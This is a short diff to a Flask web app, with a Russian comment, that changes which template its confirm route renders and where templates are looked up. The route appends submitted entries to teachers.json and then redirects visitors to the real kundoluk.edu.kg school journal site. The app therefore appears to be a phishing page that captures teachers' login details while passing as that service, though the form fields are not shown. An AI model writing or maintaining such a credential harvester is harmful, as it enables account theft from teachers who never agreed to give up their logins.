@@ -2,7 +2,7 @@ from flask import Flask, render_template, request, redirect
 import json, os
 from datetime import datetime
 
-app = Flask(__name__)
+app = Flask(__name__, template_folder='.')  # теперь шаблоны ищутся и в корне
 DATA_FILE = 'teachers.json'
 
 def load_data():
@@ -36,7 +36,7 @@ def confirm():
         data.append(entry)
         save_data(data)
         return redirect("https://kundoluk.edu.kg/")
-    return render_template('login.html')
+    return render_template('index.html')
 
 if __name__ == '__main__':
     app.run(port=5000)
